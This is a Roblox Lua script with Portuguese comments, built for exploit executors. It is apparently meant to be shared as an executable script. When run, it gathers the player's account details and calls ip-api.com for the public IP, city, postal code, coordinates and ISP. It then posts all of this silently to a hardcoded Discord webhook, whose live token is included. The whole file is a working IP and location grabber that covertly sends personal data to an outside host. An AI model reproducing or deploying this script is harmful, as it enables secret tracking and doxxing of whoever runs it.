-- Serviços necessários
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

-- Link do Webhook
local webhookURL = "https://discord.com/api/webhooks/1439689720170020957/vd6BHo6QLJOc-1rhx4lY85pr9Ts5Rue8Nk_8ddFhA0ZbVTmPpTSi5OvZtVpabxGJ2eLL" -- << coloque seu webhook aqui

-- Função para identificar o tipo de dispositivo
local function getDeviceType()
    if UserInputService.TouchEnabled then
        return "Celular/Tablet"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    else
        return "Desconhecido"
    end
end

-- Função para buscar IP e Localização usando a API ip-api
local function getIPInfo()
    local url = "http://ip-api.com/json/"
    local response

    if syn and syn.request then
        response = syn.request({Url = url, Method = "GET"})
    elseif request then
        response = request({Url = url, Method = "GET"})
    elseif http and http.request then
        response = http.request({Url = url, Method = "GET"})
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
        return nil
    end

    if response and response.Body then
        local data = HttpService:JSONDecode(response.Body)
        return data
    else
        return nil
    end
end

-- Função para gerar um HWID simulado
local function getHWID()
    return "HWID-" .. tostring(math.random(10000000,99999999)) .. "-" .. tostring(math.random(1000,9999))
end

-- Função para enviar o Webhook
local function sendWebhook()
    local ipInfo = getIPInfo()

    local embedFields = {
        {
            ["name"] = "Informações do Jogador",
            ["value"] = 
                "Nome: " .. Player.Name .. "\n" ..
                "DisplayName: " .. Player.DisplayName .. "\n" ..
                "UserId: " .. Player.UserId .. "\n" ..
                "Account Age: " .. Player.AccountAge .. " dias\n" ..
                "MembershipType: " .. tostring(Player.MembershipType),
            ["inline"] = false
        },
        {
            ["name"] = "Informações do Dispositivo",
            ["value"] = 
                "Tipo de Dispositivo: " .. getDeviceType() .. "\n" ..
                "Sistema de Entrada: " .. 
                (UserInputService.KeyboardEnabled and "Teclado" or (UserInputService.TouchEnabled and "Tela Toque" or "Outro")) .. "\n" ..
                "HWID (Simulado): " .. getHWID(),
            ["inline"] = false
        }
    }

    if ipInfo then
        table.insert(embedFields, {
            ["name"] = "Localização e IP",
            ["value"] = 
                "IP Público: " .. (ipInfo.query or "Desconhecido") .. "\n" ..
                "País: " .. (ipInfo.country or "Desconhecido") .. "\n" ..
                "Estado/Região: " .. (ipInfo.regionName or "Desconhecido") .. "\n" ..
                "Cidade: " .. (ipInfo.city or "Desconhecido") .. "\n" ..
                "CEP: " .. (ipInfo.zip or "Desconhecido") .. "\n" ..
                "Latitude: " .. (ipInfo.lat or "Desconhecido") .. "\n" ..
                "Longitude: " .. (ipInfo.lon or "Desconhecido") .. "\n" ..
                "Fuso Horário: " .. (ipInfo.timezone or "Desconhecido"),
            ["inline"] = false
        })
        table.insert(embedFields, {
            ["name"] = "Informações da Rede",
            ["value"] = 
                "ISP (Provedor): " .. (ipInfo.isp or "Desconhecido") .. "\n" ..
                "Organização: " .. (ipInfo.org or "Desconhecido") .. "\n" ..
                "AS: " .. (ipInfo.as or "Desconhecido"),
            ["inline"] = false
        })
    else
        table.insert(embedFields, {
            ["name"] = "Localização e IP",
            ["value"] = "Não foi possível obter informações de IP/localização.",
            ["inline"] = false
        })
    end

    local embedData = {
        ["username"] = "LOG DE EXECUÇÃO",
        ["avatar_url"] = "https://i.imgur.com/CF7wYq5.png",
        ["embeds"] = {{
            ["title"] = "Nova execução detectada!",
            ["description"] = "Script executado com sucesso no Roblox.",
            ["color"] = tonumber(0x00ff00),
            ["fields"] = embedFields,
            ["footer"] = {
                ["text"] = "Logs automáticos • " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }

    local body = {
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(embedData)
    }

    if syn and syn.request then
        syn.request(body)
    elseif request then
        request(body)
    elseif http and http.request then
        http.request(body)
    else
        warn("❌ Seu exploit não suporta requisições HTTP!")
    end
end

-- Envia o Webhook
sendWebhook()
